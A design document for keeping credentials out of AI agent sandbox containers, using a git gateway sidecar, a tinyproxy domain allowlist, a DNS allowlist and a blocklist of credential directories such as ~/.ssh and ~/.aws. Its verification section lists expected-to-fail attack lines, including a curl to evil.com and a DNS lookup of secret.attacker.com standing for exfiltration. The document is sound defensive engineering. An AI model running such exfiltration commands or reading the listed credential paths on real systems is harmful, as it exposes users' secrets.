# Credential Isolation: Gateway Sidecar

## Summary

Keep credentials out of sandbox containers. Git operations go through a gateway service that holds tokens. Sandbox runs on Docker internal network with egress proxy.

---

## Architecture

```
┌─────────────────────────┐     ┌─────────────────────────┐     ┌─────────────────────────┐
│  Sandbox Container      │     │  Gateway Service        │     │  Egress Proxy           │
│  (No credentials)       │     │  (Holds tokens)         │     │  (Allowlisted domains)  │
│                         │     │                         │     │                         │
│  git push ──────────────┼────►│  Proxies to upstream    │     │                         │
│  (via gateway URL)      │     │  with real credentials  │     │                         │
│                         │     │                         │     │                         │
│  HTTP requests ─────────┼─────┼─────────────────────────┼────►│  Domain allowlist       │
│  (via proxy)            │     │                         │     │                         │
└─────────────────────────┘     └─────────────────────────┘     └─────────────────────────┘
      internal network                internal + external             internal + external
```

---

## Phase 1: Dangerous Path Blocklist

Block mounting credential directories into sandboxes.

**lib/validate.sh:**
```bash
DANGEROUS_PATHS=(
    "$HOME/.ssh"
    "$HOME/.aws"
    "$HOME/.config/gcloud"
    "$HOME/.config/gh"
    "$HOME/.azure"
    "$HOME/.netrc"
    "$HOME/.kube"
    "$HOME/.gnupg"
    "$HOME/.docker"
    "$HOME/.npmrc"
    "$HOME/.pypirc"
)

validate_mount_path() {
    local mount_path="$1"
    local canonical_path
    canonical_path=$(realpath -m "$mount_path" 2>/dev/null) || canonical_path="$mount_path"

    for dangerous in "${DANGEROUS_PATHS[@]}"; do
        local resolved_dangerous
        resolved_dangerous=$(realpath -m "$dangerous" 2>/dev/null) || resolved_dangerous="$dangerous"

        # Block if mount path is or contains dangerous path
        if [[ "$canonical_path" == "$resolved_dangerous" ]] || \
           [[ "$canonical_path" == "$resolved_dangerous"/* ]] || \
           [[ "$resolved_dangerous" == "$canonical_path"/* ]]; then
            error "Mount path '$mount_path' resolves to dangerous path '$resolved_dangerous'"
            return 1
        fi
    done
    return 0
}
```

**Override:** `--allow-dangerous-mount` flag for users who know what they're doing.

---

## Phase 2: Gateway Service

Simple HTTP gateway for git operations. Runs in a separate container with access to credentials.

**gateway/gateway.py:**
```python
from flask import Flask, request, Response
import subprocess
import os
import secrets

app = Flask(__name__)

GITHUB_TOKEN = os.environ['GH_TOKEN']
SESSIONS = {}  # token -> {repos: [...]}

def generate_token():
    return secrets.token_urlsafe(32)

@app.route('/health')
def health():
    return {'status': 'ok'}

@app.route('/session/create', methods=['POST'])
def create_session():
    """Called by host when creating sandbox."""
    data = request.json
    repos = data.get('repos', [])
    session_token = generate_token()
    SESSIONS[session_token] = {'repos': set(repos)}
    return {'token': session_token}

@app.route('/git/<owner>/<repo>.git/<path:path>', methods=['GET', 'POST'])
def git_proxy(owner, repo, path):
    """Proxy git operations to GitHub."""
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    session = SESSIONS.get(token)

    if not session:
        return Response('Unauthorized', status=401)

    full_repo = f"github.com/{owner}/{repo}"
    if full_repo not in session['repos']:
        return Response('Repository not in session scope', status=403)

    # Proxy to GitHub with real token
    upstream_url = f"https://{GITHUB_TOKEN}@github.com/{owner}/{repo}.git/{path}"
    # ... proxy implementation using git-http-backend or requests
```

**Session token:** Simple opaque token. No JWT, no access/refresh split. Token lives for the sandbox session lifetime.

---

## Phase 3: Docker Networking

**docker-compose.yml:**
```yaml
networks:
  sandbox_internal:
    driver: bridge
    internal: true  # Key: no external connectivity

services:
  gateway:
    build: ./gateway
    environment:
      - GH_TOKEN
    networks:
      - sandbox_internal
      - default  # External access for upstream
    volumes:
      - ./gateway/dnsmasq.conf:/etc/dnsmasq.conf:ro

  egress-proxy:
    image: tinyproxy:latest
    volumes:
      - ./gateway/tinyproxy.conf:/etc/tinyproxy/tinyproxy.conf:ro
    networks:
      - sandbox_internal
      - default

  dev:
    environment:
      - HTTP_PROXY=http://egress-proxy:8888
      - HTTPS_PROXY=http://egress-proxy:8888
      - GATEWAY_TOKEN=${GATEWAY_TOKEN}
    dns:
      - gateway  # Force DNS through gateway (blocks DNS exfiltration)
    networks:
      - sandbox_internal  # Only internal - no direct external access
    depends_on:
      - gateway
      - egress-proxy
```

**gateway/tinyproxy.conf:**
```
# Package registries
Allow registry.npmjs.org
Allow pypi.org
Allow files.pythonhosted.org

# AI APIs
Allow api.anthropic.com
Allow api.openai.com

# GitHub API (not git - that goes through gateway)
Allow api.github.com
Allow raw.githubusercontent.com
```

**gateway/dnsmasq.conf:**
```
# Allowlisted domains - forward to system resolver
# (empty after final slash = use /etc/resolv.conf)
server=/github.com/
server=/api.github.com/
server=/raw.githubusercontent.com/
server=/api.anthropic.com/
server=/api.openai.com/
server=/registry.npmjs.org/
server=/pypi.org/
server=/files.pythonhosted.org/

# NXDOMAIN for everything else (blocks DNS exfiltration)
address=/#/
```

Docker populates `/etc/resolv.conf` with the host's DNS. No hardcoded Google/Cloudflare dependency.

---

## Phase 4: Git URL Rewriting

Bake into the Docker image so it's active before any user code runs.

**Dockerfile:**
```dockerfile
# Git config to rewrite GitHub URLs to gateway
RUN cat > /etc/gitconfig <<'EOF'
[url "http://gateway:8080/git/"]
    insteadOf = https://github.com/
    insteadOf = git@github.com:
[credential]
    helper = "!f() { echo password=$GATEWAY_TOKEN; }; f"
EOF
```

**Embedded token detection (lib/validate.sh):**
```bash
validate_git_remotes() {
    local workspace="$1"
    local git_config="${workspace}/.git/config"

    [[ ! -f "$git_config" ]] && return 0

    # Simple pattern for embedded credentials
    if grep -qE '://[^:]+:[^@]+@' "$git_config"; then
        error "Embedded credential detected in git remote"
        return 1
    fi
    return 0
}
```

---

## Verification

**Should work:**
```bash
# Git via gateway
git clone http://gateway:8080/git/org/repo.git  # Works
git push origin main                             # URL rewritten, works

# Allowlisted HTTP
curl https://api.anthropic.com                   # Works via proxy
```

**Should fail:**
```bash
# Mount dangerous paths
sandbox new --mount ~/.ssh:/ssh                  # Blocked

# Direct external access
curl --noproxy '*' https://example.com           # Connection refused

# Non-allowlisted domain
curl https://evil.com                            # Proxy returns 403

# Unauthorized repo
git clone http://gateway:8080/git/other/repo.git # 403

# Credentials in sandbox env
env | grep GH_TOKEN                              # Empty

# DNS exfiltration
nslookup secret.attacker.com                     # NXDOMAIN
```

---

## Files to Create/Modify

| File | Action | Purpose |
|------|--------|---------|
| `lib/validate.sh` | Modify | Dangerous path blocklist + symlink resolution |
| `commands/new.sh` | Modify | Validate mounts, call gateway session create |
| `docker-compose.yml` | Modify | Add gateway + proxy, internal network |
| `Dockerfile` | Modify | Bake git URL rewrite |
| `gateway/gateway.py` | Create | Simple HTTP gateway |
| `gateway/Dockerfile` | Create | Gateway container (includes dnsmasq) |
| `gateway/tinyproxy.conf` | Create | Egress proxy allowlist |
| `gateway/dnsmasq.conf` | Create | DNS allowlist (blocks DNS exfiltration) |

---

## What We're NOT Doing (YAGNI)

These add complexity without proportional value for AI agent sandboxing:

| Cut | Why |
|-----|-----|
| JWT with access/refresh tokens | Simple session token is sufficient for sandbox lifetime |
| TLS on internal Docker network | Docker network isolation is sufficient |
| Rate limiting | Sandboxes aren't public APIs |
| Prometheus metrics | Not essential for isolation |
| Structured JSON audit logging | Regular logging is fine |
| Multi-provider support | Start with GitHub, add others when needed |
| 6-phase migration | Just ship the secure version |
| Log sanitizer | Don't log tokens in the first place |
